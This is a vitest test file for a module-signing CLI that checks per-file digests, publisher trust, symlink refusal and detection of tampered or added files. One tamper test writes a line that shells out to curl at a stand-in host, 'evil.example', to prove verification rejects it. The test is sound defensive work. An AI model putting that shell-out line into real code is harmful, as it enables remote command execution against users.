// `sprintengine-module sign` records the digest of every file a module ships,
// and `verify` and `pack` hold the folder to them. Run as a real subprocess
// (bundled from source with esbuild, as cli-roundtrip.test.ts does), then read
// back through the app's own trust flow, so the CLI and the app are checked
// against the same bytes.

import assert from 'node:assert/strict'
import { spawnSync } from 'node:child_process'
import { mkdirSync, mkdtempSync, readFileSync, rmSync, symlinkSync, writeFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'

import { buildSync } from 'esbuild'
import { afterAll, beforeAll, test } from 'vitest'

import { parseThirdPartyModuleManifest } from '../../../src/shared/modules/third-party-manifest'
import { classifyModuleTrust, verifyModuleSignature } from '../../../src/main/modules/module-signature'
import { canonicalManifestPayload } from '../src/manifest-validate.js'
import { signManifest } from '../src/signing.js'

let workDir = ''
let cliBundle = ''
let keyPath = ''
let fixtureCount = 0

beforeAll(() => {
  workDir = mkdtempSync(join(tmpdir(), 'sprintengine-cli-module-files-'))
  cliBundle = join(workDir, 'sprintengine-module.cjs')
  buildSync({
    entryPoints: [join(process.cwd(), 'packages/module-sdk/src/cli.ts')],
    bundle: true,
    platform: 'node',
    format: 'cjs',
    outfile: cliBundle,
  })
  keyPath = join(workDir, 'signing.key')
  assert.equal(runCli(['keygen', '--out', keyPath]).status, 0)
})

afterAll(() => {
  rmSync(workDir, { recursive: true, force: true })
})

function runCli(args: string[]): { status: number | null; stdout: string; stderr: string } {
  const { status, stdout, stderr } = spawnSync(process.execPath, [cliBundle, ...args], {
    cwd: workDir,
    encoding: 'utf8',
  })
  return { status, stdout, stderr }
}

// A module source tree the way an author has one: code, a nested asset, a
// node_modules and a stray key that pack will leave out.
function writeModuleSource(): string {
  const dir = join(workDir, `module-${fixtureCount++}`)
  mkdirSync(join(dir, 'dist', 'assets'), { recursive: true })
  mkdirSync(join(dir, 'node_modules', 'left-pad'), { recursive: true })
  writeFileSync(
    join(dir, 'manifest.json'),
    JSON.stringify({ id: 'files-fixture', displayName: 'Files fixture', version: 1, entry: { main: 'dist/main.cjs' } }),
  )
  writeFileSync(join(dir, 'dist', 'main.cjs'), 'exports.registerMain = () => {}\n')
  writeFileSync(join(dir, 'dist', 'assets', 'icon.svg'), '<svg/>\n')
  writeFileSync(join(dir, 'node_modules', 'left-pad', 'index.js'), 'module.exports = 1\n')
  writeFileSync(join(dir, 'author.key'), 'not really a key')
  return dir
}

function readManifest(dir: string) {
  const parsed = parseThirdPartyModuleManifest(readFileSync(join(dir, 'manifest.json'), 'utf8'))
  assert.ok(parsed.ok)
  if (!parsed.ok) throw new Error('unreachable')
  return parsed.manifest
}

test('sign embeds the digest of every file pack ships', () => {
  const dir = writeModuleSource()
  const signed = runCli(['sign', dir, '--key', keyPath])
  assert.equal(signed.status, 0, signed.stderr)
  assert.match(signed.stdout, /and 2 file\(s\)/)

  const manifest = readManifest(dir)
  assert.deepEqual(Object.keys(manifest.files ?? {}), ['dist/assets/icon.svg', 'dist/main.cjs'])
  assert.match(manifest.files?.['dist/main.cjs'] ?? '', /^[0-9a-f]{64}$/)
  assert.equal(verifyModuleSignature(manifest).valid, true)

  const verified = runCli(['verify', dir])
  assert.equal(verified.status, 0, verified.stderr)
  assert.match(verified.stdout, /2 file\(s\) match/)
})

test('a packed signed module is trusted by the app through its publisher key', () => {
  const dir = writeModuleSource()
  assert.equal(runCli(['sign', dir, '--key', keyPath]).status, 0)
  const outDir = join(workDir, `packed-${fixtureCount++}`)
  const packed = runCli(['pack', dir, '--out', outDir])
  assert.equal(packed.status, 0, packed.stderr)
  assert.equal(runCli(['verify', outDir]).status, 0)

  const manifest = readManifest(outDir)
  const signer = verifyModuleSignature(manifest).fingerprint!
  const trust = classifyModuleTrust(manifest, outDir, {
    trustedModules: new Map(),
    trustedKeyFingerprints: new Set([signer]),
  })
  assert.equal(trust.status, 'trusted')
  assert.equal(trust.via, 'publisher')
})

test('verify and pack refuse a code file changed after signing', () => {
  const dir = writeModuleSource()
  assert.equal(runCli(['sign', dir, '--key', keyPath]).status, 0)
  writeFileSync(join(dir, 'dist', 'main.cjs'), "require('child_process').exec('curl https://evil.example')\n")

  const verified = runCli(['verify', dir])
  assert.equal(verified.status, 1)
  assert.match(verified.stderr, /does not match the file digests/)
  assert.match(verified.stderr, /files\.dist\/main\.cjs: does not match the signed digests/)

  const packed = runCli(['pack', dir, '--out', join(workDir, `packed-${fixtureCount++}`)])
  assert.equal(packed.status, 1)
  assert.match(packed.stderr, /changed after signing/)
})

test('verify refuses a file added after signing', () => {
  const dir = writeModuleSource()
  assert.equal(runCli(['sign', dir, '--key', keyPath]).status, 0)
  writeFileSync(join(dir, 'dist', 'extra.cjs'), 'module.exports = 1\n')
  const verified = runCli(['verify', dir])
  assert.equal(verified.status, 1)
  assert.match(verified.stderr, /files\.dist\/extra\.cjs: is not listed in the signed digests/)
})

test('verify refuses a manifest signed without files, though its signature is valid', () => {
  const dir = writeModuleSource()
  // Signed the way a manifest was signed before `files`: declaration only.
  const declaration = readManifest(dir)
  const signature = signManifest(declaration, readFileSync(keyPath, 'utf8'))
  writeFileSync(join(dir, 'manifest.json'), JSON.stringify({ ...declaration, signature }))
  assert.equal(canonicalManifestPayload(declaration).includes('"files"'), false)
  assert.equal(verifyModuleSignature(readManifest(dir)).valid, true)

  const verified = runCli(['verify', dir])
  assert.equal(verified.status, 1)
  assert.match(verified.stderr, /carries no "files" digests/)
  const packed = runCli(['pack', dir, '--out', join(workDir, `packed-${fixtureCount++}`)])
  assert.equal(packed.status, 0, packed.stderr)
  assert.match(packed.stdout, /signed WITHOUT file digests/)
})

test('sign refuses a module with a symbolic link in it', () => {
  const dir = writeModuleSource()
  writeFileSync(join(workDir, `outside-${fixtureCount}.cjs`), 'module.exports = 1\n')
  symlinkSync(join(workDir, `outside-${fixtureCount}.cjs`), join(dir, 'dist', 'linked.cjs'))
  const signed = runCli(['sign', dir, '--key', keyPath])
  assert.equal(signed.status, 1)
  assert.match(signed.stderr, /files\.dist\/linked\.cjs: is a symbolic link/)
})

test('sign refuses an entry file the module does not contain', () => {
  const dir = writeModuleSource()
  rmSync(join(dir, 'dist', 'main.cjs'))
  const signed = runCli(['sign', dir, '--key', keyPath])
  assert.equal(signed.status, 1)
  assert.match(signed.stderr, /entry\.main: declared file "dist\/main\.cjs" is not in the module/)
})
